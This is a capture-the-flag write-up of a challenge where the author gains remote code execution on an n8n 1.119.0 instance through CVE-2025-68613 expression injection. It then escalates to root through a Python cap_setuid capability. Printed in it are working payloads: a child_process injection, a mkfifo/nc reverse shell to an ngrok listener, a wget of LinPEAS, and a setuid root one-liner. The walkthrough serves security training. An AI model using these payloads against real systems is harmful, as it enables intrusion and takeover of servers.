## PLUS ULTRA!!!

<img width="619" height="800" alt="image" src="https://github.com/user-attachments/assets/cc8bc682-8db9-417b-858d-dc8e4fac3629" />

We are given an instance that had **[n8n](https://n8n.io/)** runnning. 

> n8n is an open-source, visual workflow automation tool that lets users connect different apps and services to automate repetitive tasks, data movement, and complex processes without extensive coding. It uses a node-based system on a drag-and-drop canvas, allowing technical and non-technical users to build intricate integrations, from simple data syncs to advanced AI-powered workflows, with options for self-hosting or using their cloud service 

Once, authenticated. We're being greet with n8n critical **1.119.0 Version** which could lead to known RCE. 

<img width="1912" height="958" alt="image" src="https://github.com/user-attachments/assets/942a40cb-c665-4376-84c0-8bb51de32b93" />

<img width="676" height="485" alt="image" src="https://github.com/user-attachments/assets/0171ca9b-8b64-4c1b-9911-f7193290ee40" />

Here's more about **[CVE-2025-68613](https://github.com/wioui/n8n-CVE-2025-68613-exploit)**. So let's proceed in exploiting. First, we need to create a new workflow. However in our case, we already given `Project Plus Ultra`. 

Click the **workflow**, open **node panel** and add `Edit Fields (Set)` nodes.

<img width="1612" height="601" alt="image" src="https://github.com/user-attachments/assets/32f0454d-8b40-4cdd-b7f9-c0a9b058cef7" />

<img width="1557" height="862" alt="image" src="https://github.com/user-attachments/assets/f113644a-d871-4e9f-a433-663fb3988b24" />

<img width="506" height="404" alt="image" src="https://github.com/user-attachments/assets/166a781c-8436-44a1-873c-744684e1d4bf" />

The input form of the value is where we would inject our payload. 

```
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

<img width="1248" height="870" alt="image" src="https://github.com/user-attachments/assets/48624fdb-1b49-45c5-be24-28e222b07ab5" />

We verified the exploit is working. I then do a reverse shell connection that ive generate from **[revshells.com](https://www.revshells.com/)**. Don't forget to setup our listener to be publicly accessible. Here's our listener:
```
penelope.py -p 4444 
```
Used ngrok to make it publicly accessible
```
ngrok tcp 4444
```
Make sure to use ngrok ip and port
```
{{ (function(){ return this.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP PORT >/tmp/f').toString() })() }}
```

### Shell as node

<img width="1557" height="432" alt="image" src="https://github.com/user-attachments/assets/2b319a40-e724-4a89-ad59-973422bf623f" />

Once i received a shell, straight away i look for any utilities could be use to download **[LinPEAS.sh](https://raw.githubusercontent.com/Mortemax/linux-privilege-escalation-awsome-script/refs/heads/master/linpeas.sh)** from github to PE (i don't have anytime at that time to do manual enumeration, cause i try this challenge around last 20 min)

<img width="932" height="294" alt="image" src="https://github.com/user-attachments/assets/971f5e07-ce0e-4663-8471-d42d1d6ff94d" />

```
wget https://raw.githubusercontent.com/Mortemax/linux-privilege-escalation-awsome-script/refs/heads/master/linpeas.sh                                                                     
```

As for the linpeas result:

<img width="886" height="456" alt="image" src="https://github.com/user-attachments/assets/46252836-68e4-44ba-83a9-5ab364383e2d" />

We identified there's python capabilties which can change uid. In this case, Python can use its `cap_setuid` ability to change its user ID to root, which means it can run commands as the root user. And we can spawn our own bash shell as root. For further explaination, can read **[here](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)**

### Shell as root
<img width="526" height="348" alt="image" src="https://github.com/user-attachments/assets/aac7c70e-659d-4c63-bab8-ea4cd32d7564" />

Exploit:
```
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Once we've gotten root priv, we can get the flag
```
CYNX{Plus_Ultr4_Sm4sh_Th3_K3rn3l}
```
